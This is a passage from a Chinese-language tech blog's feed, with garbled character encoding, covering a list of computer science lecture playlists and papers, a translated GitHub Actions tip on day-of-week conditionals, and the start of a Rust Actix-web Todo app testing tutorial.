href="https://www.youtube.com/playlist?list=PL-XXv-cvA_iD8wQm8U0gG_Z1uHjImKXFy">è®¡ç®—æœºç§‘å­¦ 70, 001 - 2015 å¹´æ˜¥å­£ - ç¦»æ•£æ•°å­¦å’Œæ¦‚ç‡ç†è®º</a></p></li><li><p><a href="https://www.youtube.com/playlist?list=PL3o9D4Dl2FJ9q0_gtFXPh_H4POI5dK0yG">ç¦»æ•£æ•°å­¦ (19 ä¸ªè§†é¢‘)</a></p></li><li><p><a href="https://www.youtube.com/playlist?list=PLGxuz-nmYlQPOc4w1Kp2MZrdqOOm4Jxeo">ç¦»æ•£æ•°å­¦ï¼ˆç¬¬ä¸€éƒ¨åˆ†ï¼‰ï¼ŒSarada Herke ï¼ˆ5ä¸ªè§†é¢‘ï¼‰</a></p></li><li><p>CSE373 - ç®—æ³•åˆ†æ (25 ä¸ªè§†é¢‘)</p><ul><li><a href="https://www.youtube.com/watch?v=ZFjhkohHdAA&amp;list=PLOtl7M3yp-DV69F32zdK7YJcNXpTunF2b&amp;index=1">Skiena çš„ç®—æ³•è®¾è®¡æ‰‹å†Œè®²åº§</a></li></ul></li><li><p><a href="https://www.youtube.com/watch?v=mFPmKGIrQs4&amp;list=PL-XXv-cvA_iAlnI-BQr9hjqADPBtujFJd">UC Berkeley 61B (2014 å¹´æ˜¥å­£): æ•°æ®ç»“æ„ (25 ä¸ªè§†é¢‘)</a></p></li><li><p><a href="https://www.youtube.com/playlist?list=PL4BBB74C7D2A1049C">UC Berkeley 61B (2006 å¹´ç§‹å­£): æ•°æ®ç»“æ„ (39 ä¸ªè§†é¢‘)</a></p></li><li><p><a href="https://www.youtube.com/watch?v=gJJeUFyuvvg&amp;list=PL-XXv-cvA_iCl2-D-FS5mk0jFF6cYSJs_">UC Berkeley 61Cï¼šè®¡ç®—æœºç»“æ„ (26 ä¸ªè§†é¢‘)</a></p></li><li><p><a href="https://www.youtube.com/playlist?list=PLJ9pm_Rc9HesnkwKlal_buSIHA-jTZMpO">OOSEï¼šä½¿ç”¨ UML å’Œ Java è¿›è¡Œè½¯ä»¶å¼€å‘ (21 ä¸ªè§†é¢‘)</a></p></li><li><p><del><a href="https://www.youtube.com/watch?v=UH0QYvtP7Rk&amp;index=20&amp;list=PLkFD6_40KJIwEiwQx1dACXwh-2Fuo32qr">UC Berkeley CS 152: è®¡ç®—æœºç»“æ„å’Œå·¥ç¨‹ (20 ä¸ªè§†é¢‘)</a></del></p></li><li><p><a href="https://www.youtube.com/playlist?list=PLrRW1w6CGAcXbMtDFj205vALOGmiRc82-">MIT 6.004: è®¡ç®—ç»“æ„ (49 è§†é¢‘)</a></p></li><li><p><a href="https://www.youtube.com/playlist?list=PL5PHm2jkkXmi5CxxI7b3JCL1TWybTDtKq">å¡å…§åŸºæ¢…éš†å¤§å­¦ - è®¡ç®—æœºæ¶æ„è®²åº§ (39 ä¸ªè§†é¢‘)</a></p></li><li><p><a href="https://www.youtube.com/watch?v=HtSuA80QTyo&amp;list=PLUl4u3cNGP61Oq3tWYp6V_F-5jb5L2iHb&amp;nohtml5=False">MIT 6.006ï¼šç®—æ³•ä»‹ç» (47 ä¸ªè§†é¢‘)</a></p></li><li><p><a href="https://www.youtube.com/watch?v=zm2VP0kHl1M&amp;list=PL6535748F59DCA484">MIT 6.033ï¼šè®¡ç®—æœºç³»ç»Ÿå·¥ç¨‹ (22 ä¸ªè§†é¢‘)</a></p></li><li><p><a href="https://www.youtube.com/playlist?list=PLUl4u3cNGP63gFHB6xb-kVBiQHYe_4hSi">MIT 6.034ï¼šäººå·¥æ™ºèƒ½ï¼Œ2010 å¹´ç§‹å­£ (30 ä¸ªè§†é¢‘)</a></p></li><li><p><a href="https://www.youtube.com/watch?v=L3LMbpZIKhQ&amp;list=PLB7540DEDD482705B">MIT 6.042Jï¼šè®¡ç®—æœºç§‘å­¦æ•°å­¦, 2010 å¹´ç§‹å­£ (25 ä¸ªè§†é¢‘)</a></p></li><li><p><a href="https://www.youtube.com/watch?v=2P-yW7LQr08&amp;list=PLUl4u3cNGP6317WaSNfmCvGym2ucw3oGp">MIT 6.046ï¼šç®—æ³•è®¾è®¡ä¸åˆ†æ (34 ä¸ªè§†é¢‘)</a></p></li><li><p><a href="https://www.youtube.com/watch?v=phxsQrZQupo&amp;list=PL_2Bwul6T-A7OldmhGODImZL8KEVE38X7">MIT 6.050Jï¼šä¿¡æ¯å’Œç†µ, 2008 å¹´æ˜¥å­£ (19 ä¸ªè§†é¢‘)</a></p></li><li><p><a href="https://www.youtube.com/watch?v=T0yzrZL1py0&amp;list=PLUl4u3cNGP61hsJNdULdudlRL493b-XZf&amp;index=1">MIT 6.851ï¼šé«˜ç­‰æ•°æ®ç»“æ„ (22 ä¸ªè§†é¢‘)</a></p></li><li><p><a href="https://www.youtube.com/playlist?list=PL6ogFv-ieghdoGKGg2Bik3Gl1glBTEu8c">MIT 6.854: é«˜ç­‰ç®—æ³•, 2016 å¹´æ˜¥å­£ (24 ä¸ªè§†é¢‘)</a></p></li><li><p><a href="https://www.youtube.com/playlist?list=PL2SOU6wwxB0uP4rJgf5ayhHWgw7akUWSf">Harvard COMPSCI 224ï¼šé«˜çº§ç®—æ³•ï¼ˆ25ä¸ªè§†é¢‘ï¼‰</a></p></li><li><p><a href="https://www.youtube.com/watch?v=GqmQg-cszw4&amp;index=1&amp;list=PLUl4u3cNGP62K2DjQLRxDNRi0z2IRWnNh">MIT 6.858ï¼šè®¡ç®—æœºç³»ç»Ÿå®‰å…¨, 2014 å¹´ç§‹å­£</a></p></li><li><p><a href="https://www.youtube.com/view_play_list?p=9D558D49CA734A02">æ–¯å¦ç¦: ç¼–ç¨‹èŒƒä¾‹ (27 ä¸ªè§†é¢‘)</a></p></li><li><p><a href="https://www.youtube.com/playlist?list=PL6N5qY2nvvJE8X75VkXglSrVhLv1tVcfy">å¯†ç å­¦å¯¼è®ºï¼ŒChristof Paar</a></p><ul><li><a href="http://www.crypto-textbook.com/">è¯¾ç¨‹ç½‘ç«™ä»¥åŠå¹»ç¯ç‰‡å’Œé—®é¢˜é›†</a></li></ul></li><li><p><a href="https://www.youtube.com/playlist?list=PLLssT5z_DsK9JDLcT8T62VtzwyW9LNepV">å¤§æ•°æ® - æ–¯å¦ç¦å¤§å­¦ (94 ä¸ªè§†é¢‘)</a></p></li><li><p><a href="https://www.youtube.com/user/DrSaradaHerke/playlists?shelf_id=5&amp;view=50&amp;sort=dd">å›¾è®ºï¼ŒSarada Herkeï¼ˆ67ä¸ªè§†é¢‘ï¼‰</a></p></li></ul><h2><span id="ji-suan-ji-ke-xue-ke-cheng">è®¡ç®—æœºç§‘å­¦è¯¾ç¨‹</span></h2><ul><li><a href="https://github.com/open-source-society/computer-science">åœ¨çº¿ CS è¯¾ç¨‹ç›®å½•</a></li><li><a href="https://github.com/prakhar1989/awesome-courses">CS è¯¾ç¨‹ç›®å½• (ä¸€äº›æ˜¯åœ¨çº¿è®²åº§)</a></li></ul><h2><span id="lun-wen">è®ºæ–‡</span></h2><ul><li><a href="https://www.cs.cmu.edu/~crary/819-f09/">å–œæ¬¢ç»å…¸çš„è®ºæ–‡ï¼Ÿ</a></li><li><a href="http://spinroot.com/courses/summer/Papers/hoare_1978.pdf">1978: é€šä¿¡é¡ºåºå¤„ç†</a><ul><li><a href="https://godoc.org/github.com/thomas11/csp">Go å®ç°</a></li></ul></li><li><a href="http://static.googleusercontent.com/media/research.google.com/en//archive/gfs-sosp2003.pdf">2003: The Google æ–‡ä»¶ç³»ç»Ÿ</a><ul><li>2012 å¹´è¢« Colossus å–ä»£äº†</li></ul></li><li><a href="http://static.googleusercontent.com/media/research.google.com/en//archive/mapreduce-osdi04.pdf">2004: MapReduce: Simplified Data Processing on Large Clusters</a><ul><li>å¤§å¤šè¢«äº‘æ•°æ®æµå–ä»£äº†?</li></ul></li><li><a href="https://static.googleusercontent.com/media/research.google.com/en//archive/bigtable-osdi06.pdf">2006å¹´ï¼šBigtableï¼šç»“æ„åŒ–æ•°æ®çš„åˆ†å¸ƒå¼å­˜å‚¨ç³»ç»Ÿ</a><ul><li><a href="https://cloud.google.com/files/BigQueryTechnicalWP.pdf">æ·±å…¥äº†è§£Google BigQuery</a></li></ul></li><li><a href="https://research.google.com/archive/chubby-osdi06.pdf">2006å¹´ï¼šé’ˆå¯¹æ¾æ•£è€¦åˆçš„åˆ†å¸ƒå¼ç³»ç»Ÿçš„Chubby LockæœåŠ¡</a></li><li><a href="http://s3.amazonaws.com/AllThingsDistributed/sosp/amazon-dynamo-sosp2007.pdf">2007å¹´ï¼šDynamoï¼šäºšé©¬é€Šçš„é«˜å¯ç”¨é”®å€¼å­˜å‚¨</a><ul><li>Dynamoè®ºæ–‡å¯åŠ¨äº†NoSQLé©å‘½</li></ul></li><li><a href="https://www.akkadia.org/drepper/cpumemory.pdf">2007: æ¯ä¸ªç¨‹åºå‘˜éƒ½åº”è¯¥çŸ¥é“çš„å†…å­˜çŸ¥è¯† (éå¸¸é•¿ï¼Œä½œè€…å»ºè®®è·³è¿‡æŸäº›ç« èŠ‚æ¥é˜…è¯»)</a></li><li><a href="https://research.google.com/pubs/archive/36356.pdf">2010å¹´ï¼šDapperï¼Œä¸€ä¸ªå¤§å‹åˆ†å¸ƒå¼ç³»ç»Ÿè·Ÿè¸ªåŸºç¡€ç»“æ„</a></li><li><a href="https://static.googleusercontent.com/media/research.google.com/en//pubs/archive/36632.pdf">2010å¹´ï¼šDremelï¼šWebè§„æ¨¡æ•°æ®é›†çš„äº¤äº’å¼åˆ†æ</a></li><li><a href="https://www.wired.com/2012/07/google-colossus/">2012: Google çš„ Colossus</a><ul><li>æ²¡æœ‰è®ºæ–‡</li></ul></li><li>2012: AddressSanitizer: å¿«é€Ÿçš„å†…å­˜è®¿é—®æ£€æŸ¥å™¨:<ul><li><a href="http://static.googleusercontent.com/media/research.google.com/en//pubs/archive/37752.pdf">è®ºæ–‡</a></li><li><a href="https://www.usenix.org/conference/atc12/technical-sessions/presentation/serebryany">è§†é¢‘</a></li></ul></li><li>2013: Spanner: Google çš„åˆ†å¸ƒå¼æ•°æ®åº“:<ul><li><a href="http://static.googleusercontent.com/media/research.google.com/en//archive/spanner-osdi2012.pdf">è®ºæ–‡</a></li><li><a href="https://www.usenix.org/node/170855">è§†é¢‘</a></li></ul></li><li><a href="http://static.googleusercontent.com/media/research.google.com/en//pubs/archive/43146.pdf">2014: Machine Learning: The High-Interest Credit Card of Technical Debt</a></li><li><a href="http://static.googleusercontent.com/media/research.google.com/en//pubs/archive/43790.pdf">2015: Continuous Pipelines at Google</a></li><li><a href="https://static.googleusercontent.com/media/research.google.com/en//pubs/archive/44686.pdf">2015: å¤§è§„æ¨¡é«˜å¯ç”¨: æ„å»º Google Ads çš„æ•°æ®åŸºç¡€è®¾æ–½</a></li><li><a href="http://download.tensorflow.org/paper/whitepaper2015.pdf">2015: TensorFlow: å¼‚æ„åˆ†å¸ƒå¼ç³»ç»Ÿä¸Šçš„å¤§è§„æ¨¡æœºå™¨å­¦ä¹ </a></li><li><a href="http://static.googleusercontent.com/media/research.google.com/en//pubs/archive/43835.pdf">2015: å¼€å‘è€…åº”è¯¥å¦‚ä½•æœç´¢ä»£ç ï¼šç”¨ä¾‹å­¦ä¹ </a></li><li><a href="http://static.googleusercontent.com/media/research.google.com/en//pubs/archive/44843.pdf">2016: Borg, Omega, and Kubernetes</a></li></ul><h2><span id="license">LICENSE</span></h2><p><a href="https://github.com/jwasham/coding-interview-university/blob/master/LICENSE.txt">CC-BY-SA-4.0</a></p><blockquote><p>GitHub repo: <a href="https://github.com/qiwihui/blog">qiwihui/blog</a></p><p>Follow me: <a href="https://github.com/qiwihui">@qiwihui</a></p><p>Site: <a href="https://qiwihui.com">QIWIHUI</a></p></blockquote><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      ç¼–ç é¢è¯•å­¦ä¹ æ‰‹å†Œï¼ˆCoding Interview Universityï¼‰
    
    </summary>
    
      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="ç¿»è¯‘" scheme="https://qiwihui.com/tags/%E7%BF%BB%E8%AF%91/"/>
    
      <category term="Python" scheme="https://qiwihui.com/tags/Python/"/>
    
      <category term="æœºå™¨å­¦ä¹ " scheme="https://qiwihui.com/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>GitHub Actions ç¬¬16å¤©ï¼šå…±äº«æ•°æ®çš„æ¡ä»¶</title>
    <link href="https://qiwihui.com/qiwihui-blog-99/"/>
    <id>https://qiwihui.com/qiwihui-blog-99/</id>
    <published>2022-08-13T01:54:25.570Z</published>
    <updated>2024-05-15T02:25:31.468Z</updated>
    
    <content type="html"><![CDATA[<p>æ˜¨å¤©ï¼Œæˆ‘ä»¬ç ”ç©¶äº†å¦‚ä½•åœ¨å·¥ä½œæµæ­¥éª¤ä¹‹ä¸€ä¸­<a href="https://qiwihui.com/qiwihui-blog-98/">è®¾ç½®è‡ªå®šä¹‰æ•°æ®</a>ï¼Œä»¥ä¾¿åœ¨åç»­æ­¥éª¤ä¸­ä½¿ç”¨ã€‚æˆ‘ä»¬é€šè¿‡å‘<a href="https://help.github.com/en/actions/automating-your-workflow-with-github-actions/contexts-and-expression-syntax-for-github-actions#contexts">envä¸Šä¸‹æ–‡</a>æ·»åŠ æ•°æ®æ¥åšåˆ°è¿™ä¸€ç‚¹ï¼Œå®ƒæ˜¯ä¸€ä¸ªä½ å¯ä»¥è¯»å†™çš„å±æ€§åŒ…ã€‚</p><p>ä½†æ˜¯ä½ ä¸å¿…å°†è‡ªå·±å±€é™äºä»…åœ¨ä½ çš„æ­¥éª¤ä¸­ä½¿ç”¨ <code>env</code> ä¸Šä¸‹æ–‡ã€‚ä½ è¿˜å¯ä»¥åœ¨å·¥ä½œæµæœ¬èº«ä¸­ä½¿ç”¨ <code>env</code> ä¸Šä¸‹æ–‡ï¼Œå¹¶æ ¹æ®åœ¨å…ˆå‰æ­¥éª¤ä¸­è®¾ç½®çš„æ•°æ®æ¥<a href="https://qiwihui.com/qiwihui-blog-96/">è®¾ç½®æ¡ä»¶</a>ã€‚</p><p>ä¾‹å¦‚ï¼Œä½ å¯èƒ½æœ‰ä¸€ä¸ªæ¯å¤©è¦è¿è¡Œçš„å·¥ä½œæµï¼Œå¹¶ä¸”ä½ å¸Œæœ›å¯¹è¯¥å·¥ä½œæµåœ¨æ˜ŸæœŸä¸€çš„è¿è¡Œæ–¹å¼è¿›è¡Œè¾ƒå°çš„ä¿®æ”¹ã€‚ä½ å¯ä»¥ä½¿ç”¨ <a href="https://help.github.com/en/actions/automating-your-workflow-with-github-actions/workflow-syntax-for-github-actions#onschedule"><code>schedule</code> è§¦å‘å™¨</a>æ¯å¤©è¿è¡Œå·¥ä½œæµç¨‹ã€‚ä½ å¯ä»¥å¤åˆ¶è¯¥å·¥ä½œæµç¨‹ï¼Œå¹¶æ·»åŠ åªå¸Œæœ›åœ¨æ˜ŸæœŸä¸€è¿è¡Œçš„ç‰¹æ®Šæ›´æ”¹ã€‚ä½†æ˜¯ï¼Œå‘µå‘µï¼Œç»´æŒä¸¤ä¸ªç›¸ä¼¼ä½†åªæœ‰ä¸€ç‚¹ç‚¹ä¸åŒçš„å·¥ä½œæµç¨‹æ˜¯ä¸€ä¸ªä¸¥é‡çš„éš¾é¢˜ã€‚</p><span id="more"></span><p>å–è€Œä»£ä¹‹çš„æ˜¯ï¼Œä½ å¯ä»¥æŸ¥çœ‹æ˜ŸæœŸå‡ å¹¶åœ¨æ­¤åŸºç¡€ä¸Šè®¾ç½®ä¸€ä¸ªç¯å¢ƒå˜é‡â”€â”€åœ¨è¿™é‡Œï¼Œæˆ‘å°†ä½¿ç”¨bashè¯­æ³•è¿è¡Œ <code>date</code> å‘½ä»¤ä»¥æ‰“å°ç¼©å†™çš„æ˜ŸæœŸå‡ ï¼Œå¹¶å°†å…¶æ”¾å…¥æˆ‘çš„ <code>echo</code> è¯­å¥ä¸­ï¼Œå°† <code>DAY_OF_WEEK</code> åœ¨æˆ‘ä»¬çš„ <code>env</code> ä¸Šä¸‹æ–‡ä¸­è®¾ç½®å˜é‡ ã€‚ç„¶åï¼Œæˆ‘å°†å…¶ <code>env.DAY_OF_WEEK</code> ä½œä¸ºåç»­æ­¥éª¤çš„æ¡ä»¶ã€‚</p><script src="https://gist.github.com/ethomson/c241fcd622172139ccaae0ab8088c75c.js"></script><p>ä½¿ç”¨æ­¤é…ç½®ï¼Œæˆ‘å°†æ¯å¤©åœ¨ä¸–ç•Œæ ‡å‡†æ—¶é—´05:00è¿è¡Œå·¥ä½œæµã€‚ä¸ä»Šå¤©ä¸€æ ·ï¼Œåœ¨æ˜ŸæœŸä¸€ï¼Œå°†è¿è¡Œä»…æ˜ŸæœŸä¸€çš„æ­¥éª¤ã€‚</p><p><img src="https://user-images.githubusercontent.com/3297411/77852191-d8776280-720f-11ea-99f0-a50f64ceabd6.png" alt="image"></p><p>ä½†æ˜¯åœ¨æœ¬å‘¨çš„å‰©ä½™æ—¶é—´é‡Œï¼Œè¯¥æ­¥éª¤å°†è¢«è·³è¿‡ã€‚</p><p><img src="https://user-images.githubusercontent.com/3297411/77852197-dca38000-720f-11ea-8aa0-9ccfab150f3a.png" alt="image"></p><p>è¿™æ˜¯å¦ä¸€ä¸ªå¾ˆå¥½çš„ä¾‹å­ï¼Œè¯´æ˜GitHub Actionså¦‚ä½•ä¸ºä½ æä¾›ç®€å•çš„åŸè¯­ï¼Œä½ å¯ä»¥å°†å®ƒä»¬ç»„åˆåœ¨ä¸€èµ·ä»¥åˆ›å»ºåŠŸèƒ½å¼ºå¤§çš„å·¥ä½œæµã€‚</p><p>åŸæ–‡é“¾æ¥ï¼š<a href="https://www.edwardthomson.com/blog/github_actions_16_conditionals_with_shared_data.html">https://www.edwardthomson.com/blog/github_actions_16_conditionals_with_shared_data.html</a></p><blockquote><p>GitHub repo: <a href="https://github.com/qiwihui/blog">qiwihui/blog</a></p><p>Follow me: <a href="https://github.com/qiwihui">@qiwihui</a></p><p>Site: <a href="https://qiwihui.com">QIWIHUI</a></p></blockquote><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      GitHub Actions ç¬¬16å¤©ï¼šå…±äº«æ•°æ®çš„æ¡ä»¶
    
    </summary>
    
    
      <category term="æŠ€æœ¯" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="ç¿»è¯‘" scheme="https://qiwihui.com/tags/%E7%BF%BB%E8%AF%91/"/>
    
      <category term="tips" scheme="https://qiwihui.com/tags/tips/"/>
    
      <category term="github actions" scheme="https://qiwihui.com/tags/github-actions/"/>
    
  </entry>
  
  <entry>
    <title>ç”¨ Rust Actix-web å†™ä¸€ä¸ª Todo åº”ç”¨ï¼ˆå››ï¼‰â”€â”€ æµ‹è¯•</title>
    <link href="https://qiwihui.com/qiwihui-blog-108/"/>
    <id>https://qiwihui.com/qiwihui-blog-108/</id>
    <published>2022-08-13T01:54:25.560Z</published>
    <updated>2024-05-15T02:25:31.468Z</updated>
    
    <content type="html"><![CDATA[<p>å¯¹ç¨‹åºè¿›è¡Œé›†æˆæµ‹è¯•ã€‚</p><span id="more"></span><h2><span id="ce-shi-qian-chong-gou">æµ‹è¯•å‰é‡æ„</span></h2><p>åœ¨æµ‹è¯•å‰ï¼Œå…ˆç®€å•é‡æ„ï¼Œæ–¹ä¾¿æ„å»ºæµ‹è¯•ã€‚</p><h3><span id="1-jiang-lu-you-chou-qu-cheng-dan-du-de-mo-kuai">1. å°†è·¯ç”±æŠ½å–æˆå•ç‹¬çš„æ¨¡å—</span></h3><p><code>routes.rs</code></p><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">use</span> crate::handlers;</span><br><span class="line"><span class="keyword">use</span> actix_web::web;</span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">fn</span> <span class="title function_">routes</span>(cfg: &amp;<span class="keyword">mut</span> web::ServiceConfig) &#123;</span><br><span class="line">    cfg.<span class="title function_ invoke__">service</span>(handlers::hello)</span><br><span class="line">        .<span class="title function_ invoke__">route</span>(<span class="string">&quot;/todos&#123;_:/?&#125;&quot;</span>, web::<span class="title function_ invoke__">get</span>().<span class="title function_ invoke__">to</span>(handlers::todos))</span><br><span class="line">        .<span class="title function_ invoke__">route</span>(<span class="string">&quot;/todos&#123;_:/?&#125;&quot;</span>, web::<span class="title function_ invoke__">post</span>().<span class="title function_ invoke__">to</span>(handlers::create_todo))</span><br><span class="line">        .<span class="title function_ invoke__">route</span>(<span class="string">&quot;/todos/&#123;list_id&#125;&#123;_:/?&#125;&quot;</span>, web::<span class="title function_ invoke__">get</span>().<span class="title function_ invoke__">to</span>(handlers::todo))</span><br><span class="line">        .<span class="title function_ invoke__">route</span>(</span><br><span class="line">            <span class="string">&quot;/todos/&#123;list_id&#125;/items&#123;_:/?&#125;&quot;</span>,</span><br><span class="line">            web::<span class="title function_ invoke__">get</span>().<span class="title function_ invoke__">to</span>(handlers::items),</span><br><span class="line">        )</span><br><span class="line">        .<span class="title function_ invoke__">route</span>(</span><br><span class="line">            <span class="string">&quot;/todos/&#123;list_id&#125;/items&#123;_:/?&#125;&quot;</span>,</span><br><span class="line">            web::<span class="title function_ invoke__">post</span>().<span class="title function_ invoke__">to</span>(handlers::create_item),</span><br><span class="line">        )</span><br><span class="line">        .<span class="title function_ invoke__">route</span>(</span><br><span class="line">            <span class="string">&quot;/todos/&#123;list_id&#125;/items/&#123;item_id&#125;&#123;_:/?&#125;&quot;</span>,</span><br><span class="line">            web::<span class="title function_ invoke__">get</span>().<span class="title function_ invoke__">to</span>(handlers::get_item),</span><br><span class="line">        )</span><br><span class="line">        .<span class="title function_ invoke__">route</span>(</span><br><span class="line">            <span class="string">&quot;/todos/&#123;list_id&#125;/items/&#123;item_id&#125;&#123;_:/?&#125;&quot;</span>,</span><br><span class="line">            web::<span class="title function_ invoke__">put</span>().<span class="title function_ invoke__">to</span>(handlers::check_todo),</span><br><span class="line">        );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¹¶å°†åŸæ¥çš„ <code>hello</code> è§†å›¾ç§»è‡³ <code>handlers.rs</code> ä¸­ï¼Œæ­¤æ—¶ <code>main.rs</code> ä¸­è·¯ç”±ä¿®æ”¹ä¸ºå¦‚ä¸‹ï¼š</p><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line">+<span class="keyword">mod</span> routes;</span><br><span class="line"><span class="comment">// ... çœç•¥</span></span><br><span class="line">+<span class="keyword">use</span> routes::routes;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// ... è½¬ç§»</span></span><br><span class="line">-<span class="meta">#[get(<span class="string">&quot;/&quot;</span>)]</span></span><br><span class="line">-<span class="keyword">async</span> <span class="keyword">fn</span> <span class="title function_">hello</span>() <span class="punctuation">-&gt;</span> <span class="keyword">impl</span> <span class="title class_">Responder</span> &#123;</span><br><span class="line">-    <span class="built_in">format!</span>(<span class="string">&quot;Hello world!&quot;</span>)</span><br><span class="line">-&#125;</span><br><span class="line">-</span><br><span class="line"> <span class="meta">#[actix_web::main]</span></span><br><span class="line"> <span class="keyword">async</span> <span class="keyword">fn</span> <span class="title function_">main</span>() <span class="punctuation">-&gt;</span> io::<span class="type">Result</span>&lt;()&gt; &#123;</span><br><span class="line">     <span class="title function_ invoke__">dotenv</span>().<span class="title function_ invoke__">ok</span>();</span><br><span class="line">@@ -<span class="number">34</span>,<span class="number">26</span> +<span class="number">31</span>,<span class="number">7</span> @@ <span class="keyword">async</span> <span class="keyword">fn</span> <span class="title function_">main</span>() <span class="punctuation">-&gt;</span> io::<span class="type">Result</span>&lt;()&gt; &#123;</span><br><span class="line">         App::<span class="title function_ invoke__">new</span>()</span><br><span class="line">             .<span class="title function_ invoke__">data</span>(AppState &#123; pool: pool.<span class="title function_ invoke__">clone</span>() &#125;)</span><br><span class="line">             .<span class="title function_ invoke__">wrap</span>(middleware::Logger::<span class="title function_ invoke__">default</span>())</span><br><span class="line"><span class="comment">// ... è½¬ç§»</span></span><br><span class="line">-            .<span class="title function_ invoke__">service</span>(hello)</span><br><span class="line">-            .<span class="title function_ invoke__">route</span>(<span class="string">&quot;/todos&#123;_:/?&#125;&quot;</span>, web::<span class="title function_ invoke__">get</span>().<span class="title function_ invoke__">to</span>(handlers::todos))</span><br><span class="line">-            .<span class="title function_ invoke__">route</span>(<span class="string">&quot;/todos&#123;_:/?&#125;&quot;</span>, web::<span class="title function_ invoke__">post</span>().<span class="title function_ invoke__">to</span>(handlers::create_todo))</span><br><span class="line">-            .<span class="title function_ invoke__">route</span>(<span class="string">&quot;/todos/&#123;list_id&#125;&#123;_:/?&#125;&quot;</span>, web::<span class="title function_ invoke__">get</span>().<span class="title function_ invoke__">to</span>(handlers::todo))</span><br><span class="line">-            .<span class="title function_ invoke__">route</span>(</span><br><span class="line">-                <span class="string">&quot;/todos/&#123;list_id&#125;/items&#123;_:/?&#125;&quot;</span>,</span><br><span class="line">-                web::<span class="title function_ invoke__">get</span>().<span class="title function_ invoke__">to</span>(handlers::items),</span><br><span class="line">-            )</span><br><span class="line">-            .<span class="title function_ invoke__">route</span>(</span><br><span class="line">-                <span class="string">&quot;/todos/&#123;list_id&#125;/items&#123;_:/?&#125;&quot;</span>,</span><br><span class="line">-                web::<span class="title function_ invoke__">post</span>().<span class="title function_ invoke__">to</span>(handlers::create_item),</span><br><span class="line">-            )</span><br><span class="line">-            .<span class="title function_ invoke__">route</span>(</span><br><span class="line">-                <span class="string">&quot;/todos/&#123;list_id&#125;/items/&#123;item_id&#125;&#123;_:/?&#125;&quot;</span>,</span><br><span class="line">-                web::<span class="title function_ invoke__">get</span>().<span class="title function_ invoke__">to</span>(handlers::get_item),</span><br><span class="line">-            )</span><br><span class="line">-            .<span class="title function_ invoke__">route</span>(</span><br><span class="line">-                <span class="string">&quot;/todos/&#123;list_id&#125;/items/&#123;item_id&#125;&#123;_:/?&#125;&quot;</span>,</span><br><span class="line">-                web::<span class="title function_ invoke__">put</span>().<span class="title function_ invoke__">to</span>(handlers::check_todo),</span><br><span class="line">-            )</span><br><span class="line">+            .<span class="title function_ invoke__">configure</span>(routes)</span><br><span class="line">     &#125;)</span><br><span class="line">     .<span class="title function_ invoke__">bind</span>(<span class="built_in">format!</span>(<span class="string">&quot;&#123;&#125;:&#123;&#125;&quot;</span>, cfg.server.host, cfg.server.port))?</span><br><span class="line">     .<span class="title function_ invoke__">run</span>()</span><br></pre></td></tr></table></figure><h3><span id="2-zeng-jia-init-pool-fang-fa">2. å¢åŠ  <code>init_pool</code> æ–¹æ³•</span></h3><p>é¦–å…ˆæˆ‘ä»¬æ·»åŠ ä¸€ä¸ªé…ç½®é”™è¯¯å¤„ç†ï¼š</p><p><code>errors.rs</code>ï¼š</p><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line">@@ -<span class="number">10</span>,<span class="number">6</span> +<span class="number">12</span>,<span class="number">7</span> @@ <span class="keyword">pub</span> <span class="keyword">enum</span> <span class="title class_">Error</span> &#123;</span><br><span class="line">     <span class="title function_ invoke__">InternalServerError</span>(<span class="type">String</span>),</span><br><span class="line">     <span class="title function_ invoke__">NotFound</span>(<span class="type">String</span>),</span><br><span class="line">     <span class="title function_ invoke__">PoolError</span>(<span class="type">String</span>),</span><br><span class="line">+    <span class="title function_ invoke__">ConfigError</span>(<span class="type">String</span>),</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>åœ¨ <code>config.rs</code> ä¸­å¢åŠ  <code>init_pool</code> æ–¹æ³•ï¼š</p><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">use</span> crate::errors::Error;</span><br><span class="line"><span class="keyword">use</span> deadpool_postgres::Pool;</span><br><span class="line"><span class="keyword">use</span> tokio_postgres::NoTls;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ... çœç•¥</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">fn</span> <span class="title function_">init_pool</span>(config: &amp;Config) <span class="punctuation">-&gt;</span> <span class="type">Result</span>&lt;Pool, Error&gt; &#123;</span><br><span class="line">    <span class="keyword">match</span> config.pg.<span class="title function_ invoke__">create_pool</span>(NoTls) &#123;</span><br><span class="line">        <span class="title function_ invoke__">Ok</span>(pool) =&gt; <span class="title function_ invoke__">Ok</span>(pool),</span><br><span class="line">        <span class="title function_ invoke__">Err</span>(_) =&gt; <span class="title function_ invoke__">Err</span>(Error::<span class="title function_ invoke__">ConfigError</span>(<span class="string">&quot;config error&quot;</span>.<span class="title function_ invoke__">into</span>())),</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="ce-shi">æµ‹è¯•</span></h2><p>é¦–å…ˆï¼Œå¢åŠ è¿è¡Œæ—¶ç¯å¢ƒåŒ…:</p><figure class="highlight toml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ...</span></span><br><span class="line"></span><br><span class="line"><span class="section">[dependencies]</span></span><br><span class="line"><span class="attr">actix-rt</span> = <span class="string">&quot;1&quot;</span></span><br></pre></td></tr></table></figure><p>åˆ›å»º <code>tests</code> ç›®å½•ï¼Œå¹¶æ·»åŠ å¦‚ä¸‹æ–‡ä»¶ï¼Œ</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">src/tests/</span><br><span class="line">â”œâ”€â”€ handlers.rs</span><br><span 